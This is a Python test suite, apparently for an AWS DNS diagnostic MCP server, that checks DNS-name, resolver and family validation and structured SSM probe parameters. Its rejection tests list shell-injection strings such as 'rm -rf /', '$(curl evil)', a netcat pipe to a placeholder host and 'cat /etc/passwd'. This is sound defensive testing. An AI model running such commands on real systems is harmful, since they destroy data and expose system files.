# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: Apache-2.0

"""Tests for the DNS Diagnostic MCP Server allowlist and input-validation logic.

These are the injection-safety tests: the analog of a SQL-safety suite for a
data-plane server. The probe family's #1 risk is shell/command injection through
the {name} and {resolver} parameters, so these assert that only well-formed DNS
names and literal-IP / allowlisted-hostname resolvers pass, and that shell
metacharacters are rejected before any command is built.
"""

import os
import sys

# Add src to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

# Allowlists must be non-wildcard so validation paths are exercised, and the
# stage must not be prod (wildcards would fail-closed at import otherwise).
os.environ.setdefault("STAGE_NAME", "dev")
os.environ.setdefault("ALLOWED_ACCOUNTS", "111122223333")
os.environ.setdefault("ALLOWED_REGIONS", "us-east-1")
os.environ.setdefault("ALLOWED_VPCS", "vpc-abc123")
os.environ.setdefault("ALLOWED_RESOLVERS", "resolver.corp.example")


class TestNameValidation:
    """{name} must be a valid DNS name with no shell metacharacters."""

    def test_valid_names(self):
        from server import _valid_name
        for n in [
            "example.com",
            "oidc.eks.us-east-1.amazonaws.com",
            "db.internal.corp",
            "a.b.c.d.e.f",
            "host",
        ]:
            assert _valid_name(n), n

    def test_rejects_injection(self):
        from server import _valid_name
        for n in [
            "example.com; rm -rf /",
            "$(curl evil)",
            "`id`",
            "a.com | nc evil 1",
            "a.com && cat /etc/passwd",
            "a.com\nsecond",
            "a com",
            "a.com'",
        ]:
            assert not _valid_name(n), n


class TestResolverValidation:
    """{resolver} must be a literal IP or an operator-allowlisted hostname."""

    def test_literal_ipv4_and_ipv6(self):
        from server import _valid_resolver
        for r in ["169.254.169.253", "10.0.0.2", "fd00:ec2::253", "8.8.8.8"]:
            assert _valid_resolver(r), r

    def test_allowlisted_hostname(self):
        from server import _valid_resolver
        assert _valid_resolver("resolver.corp.example")

    def test_rejects_non_allowlisted_hostname(self):
        from server import _valid_resolver
        # Well-formed hostname but NOT in ALLOWED_RESOLVERS -> rejected, so the
        # comparison feature cannot become an arbitrary-egress primitive.
        assert not _valid_resolver("attacker.example.net")

    def test_rejects_injection(self):
        from server import _valid_resolver
        for r in ["8.8.8.8; rm -rf /", "$(id)", "10.0.0.2|nc x 1", "10.0.0.2 x"]:
            assert not _valid_resolver(r)


class TestFamilyValidation:
    """{family} is an enum: A or AAAA only."""

    def test_family_enum(self):
        from server import _valid_family
        assert _valid_family("A")
        assert _valid_family("AAAA")
        assert not _valid_family("ANY")
        assert not _valid_family("TXT; drop")


class TestProbeBoundary:
    """The probe boundary is the SSM document (structured params), not a command
    string. Assert the server sends only Name/Resolver/Family and never a
    'commands' list."""

    def test_param_names_are_structured_only(self):
        from server import PROBE_PARAM_NAMES
        assert set(PROBE_PARAM_NAMES) == {"Name", "Resolver", "Family"}
        assert "commands" not in PROBE_PARAM_NAMES

    def test_no_command_string_builder_remains(self):
        # The old free-command plumbing must be gone - the document renders the
        # fixed probe set from structured params.
        import server
        assert not hasattr(server, "_build_probe_commands")
        assert not hasattr(server, "PROBE_TEMPLATES")

    def test_ssm_run_probe_sends_structured_params(self):
        import server

        captured = {}

        class _FakeSSM:
            def describe_instance_information(self, **kw):
                return {"InstanceInformationList": [{"InstanceId": "i-1"}]}

            def send_command(self, **kw):
                captured.update(kw)
                return {"Command": {"CommandId": "c-1"}}

            def get_command_invocation(self, **kw):
                return {"Status": "Success", "StandardOutputContent": "ok", "StandardErrorContent": ""}

        class _FakeSession:
            def client(self, name):
                return _FakeSSM()

        # Avoid the 2s poll sleep.
        orig_sleep = server.time.sleep
        server.time.sleep = lambda *_: None
        try:
            out = server._ssm_run_probe(_FakeSession(), "i-1", "example.com", "169.254.169.253", "A")
        finally:
            server.time.sleep = orig_sleep

        assert out["status"] == "Success"
        assert captured["DocumentName"]  # a document is targeted
        assert captured["Parameters"] == {
            "Name": ["example.com"], "Resolver": ["169.254.169.253"], "Family": ["A"],
        }
        assert "commands" not in captured["Parameters"]


class TestSimulateChangeSchema:
    """Mode B accepts only known, structured change types (no free text)."""

    KNOWN = {
        "enable_vpce_private_dns",
        "associate_phz",
        "add_resolver_rule",
        "associate_dns_firewall",
        "associate_profile",
        "set_snva_preference",
        "set_dhcp_dns",
    }

    def test_known_change_types_stable(self):
        # Guard against silent drift of the accepted change-type set.
        assert len(self.KNOWN) == 7


class TestDhcpDnsRead:
    """_read_dhcp_dns extracts domain-name-servers / domain-name and classifies
    AmazonProvidedDNS vs a custom resolver."""

    class _FakeEc2:
        def __init__(self, dhcp_id, configs):
            self._dhcp_id = dhcp_id
            self._configs = configs

        def describe_vpcs(self, VpcIds):
            return {"Vpcs": [{"DhcpOptionsId": self._dhcp_id}]}

        def describe_dhcp_options(self, DhcpOptionsIds):
            return {"DhcpOptions": [{"DhcpConfigurations": self._configs}]}

    def test_custom_resolver(self):
        import server
        ec2 = self._FakeEc2("dopt-1", [
            {"Key": "domain-name-servers", "Values": [{"Value": "10.1.1.53"}, {"Value": "10.1.2.53"}]},
            {"Key": "domain-name", "Values": [{"Value": "corp.example"}]},
        ])
        out = server._read_dhcp_dns(ec2, "vpc-1")
        assert out["custom_servers"] == ["10.1.1.53", "10.1.2.53"]
        assert out["is_amazon_provided"] is False
        assert out["domain_name"] == "corp.example"

    def test_amazon_provided(self):
        import server
        ec2 = self._FakeEc2("dopt-2", [
            {"Key": "domain-name-servers", "Values": [{"Value": "AmazonProvidedDNS"}]},
        ])
        out = server._read_dhcp_dns(ec2, "vpc-1")
        assert out["is_amazon_provided"] is True
        assert out["custom_servers"] == []

    def test_no_servers(self):
        import server
        ec2 = self._FakeEc2("dopt-3", [])
        out = server._read_dhcp_dns(ec2, "vpc-1")
        assert out["custom_servers"] == []
        assert out["is_amazon_provided"] is False


class TestProfilePhzOpaque:
    """_build_effective_model must emit an OPAQUE marker (not crash) when a
    profile-contained PHZ's get_hosted_zone denies cross-account. Mirrors the
    live provider->consumer finding (AccessDenied on the profile private PHZ)."""

    def _session(self):
        import botocore.exceptions

        class _R53R:  # route53resolver
            def list_resolver_rule_associations(self, **kw):
                return {"ResolverRuleAssociations": []}
            def list_firewall_rule_group_associations(self, **kw):
                return {"FirewallRuleGroupAssociations": []}
        class _R53P:  # route53profiles
            def list_profile_associations(self, **kw):
                return {"ProfileAssociations": [{"ResourceId": "vpc-abc123", "ProfileId": "rp-1"}]}
            def list_profile_resource_associations(self, **kw):
                return {"ProfileResourceAssociations": [
                    {"ResourceType": "PrivateHostedZone", "ResourceId": "Zopaque", "Name": "n"}]}
        class _R53:  # route53
            def list_hosted_zones_by_vpc(self, **kw):
                return {"HostedZoneSummaries": []}
            def get_hosted_zone(self, **kw):
                raise botocore.exceptions.ClientError(
                    {"Error": {"Code": "AccessDenied", "Message": "denied"}}, "GetHostedZone")
        class _EC2:
            def describe_vpc_attribute(self, **kw):
                return {"EnableDnsSupport": {"Value": True}}
            def describe_vpc_endpoints(self, **kw):
                return {"VpcEndpoints": []}
        class _Lattice:
            def list_service_network_vpc_associations(self, **kw):
                return {"items": []}

        clients = {"route53resolver": _R53R(), "route53profiles": _R53P(),
                   "route53": _R53(), "ec2": _EC2(), "vpc-lattice": _Lattice()}

        class _Session:
            region_name = "us-east-1"
            def client(self, name):
                return clients[name]
        return _Session()

    def test_profile_phz_denied_becomes_opaque(self):
        import server
        m = server._build_effective_model(self._session(), "vpc-abc123")
        # Build must NOT crash, and the denied profile PHZ must surface as an
        # opaque marker so its influence is not silently dropped.
        opaque = [r for r in m.resolver_rules if getattr(r, "opaque", False)]
        assert opaque, "expected an opaque marker for the denied profile PHZ"
        assert opaque[0].source == "profile:rp-1"
